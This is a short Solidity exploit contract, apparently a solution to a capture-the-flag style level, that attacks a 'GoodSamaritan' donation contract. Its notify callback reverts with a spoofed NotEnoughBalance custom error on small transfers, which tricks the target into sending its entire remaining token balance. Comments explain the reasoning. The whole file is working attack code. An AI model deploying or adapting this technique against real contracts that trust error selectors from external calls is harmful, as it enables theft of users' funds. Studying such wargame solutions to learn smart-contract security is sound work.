// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface GoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}
contract Hack {
    error NotEnoughBalance();
//@para _addr is the instance address 
    function attack (address _addr) public {
        GoodSamaritan(_addr).requestDonation(); 
    }
    //! First think about a fallback function to notice hack contract to raise 
    //! exception for  custom-error however the currency is not eth so we need interface
    //! to get notified by notify interface implemented in contract...
    function notify(uint256 amount) pure external {
//additional check on the amount, make sure we get all the token from transferRemainder()
        if(amount <= 10){
revert NotEnoughBalance();
        }
    }
}